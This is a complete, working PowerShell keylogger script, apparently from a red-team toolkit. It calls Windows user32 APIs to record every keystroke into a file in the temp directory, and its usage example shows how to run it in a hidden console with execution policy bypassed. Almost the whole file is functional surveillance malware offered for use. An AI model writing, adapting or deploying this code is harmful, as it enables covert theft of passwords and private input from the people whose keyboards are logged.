<#
.SYNOPSIS
  Standalone Powershell Script to Capture keyboard keystrokes

  Author: r00t-3xp10it (SSA RedTeam @2020)
  Required Dependencies: none
  Optional Dependencies: none
  PS Script Dev Version: v1.4

.DESCRIPTION
   Standalone Powershell script to capture keyboard keystrokes and store leaks on `$env:tmp

.EXAMPLE
   PS C:\> powershell -file keylooger.ps1
   Start Capturing keyboard keystrokes in demonstration mode

.EXAMPLE
   PS C:\> powershell -exec bypass -w 1 -file keylooger.ps1
   Start Capturing keyboard keystrokes in an hidden terminal console

.INPUTS
   None. You cannot pipe objects to keylooger.ps1

.OUTPUTS
   Saves KBlogger.txt to the selected directory. 'tmp' is the default.

.LINK
    https://github.com/r00t-3xp10it/meterpeter
    https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/keylooger.ps1
#>


function Test-KeyLogger($logPath="$env:temp\KBlogger.txt") 
{
# API declaration
$APIsignatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
 $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru
    
  # output file
  $no_output = New-Item -Path $logPath -ItemType File -Force

  try
  {
    Write-Host 'Keylogger started. Press CTRL+C to see results...' -ForegroundColor Red

    while ($true) {
      Start-Sleep -Milliseconds 40            
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get key state
        $keystate = $API::GetAsyncKeyState($ascii)
        # if key pressed
        if ($keystate -eq -32767) {
          $null = [console]::CapsLock
          # translate code
          $virtualKey = $API::MapVirtualKey($ascii, 3)
          # get keyboard state and create stringbuilder
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)
          $loggedchar = New-Object -TypeName System.Text.StringBuilder

          # translate virtual key          
          if ($API::ToUnicode($ascii, $virtualKey, $kbstate, $loggedchar, $loggedchar.Capacity, 0)) 
          {
            #if success, add key to logger file
            [System.IO.File]::AppendAllText($logPath, $loggedchar, [System.Text.Encoding]::Unicode)
          }
        }
      }
    }
  }
  finally
  {    
    notepad $logPath
  }
}

Test-KeyLogger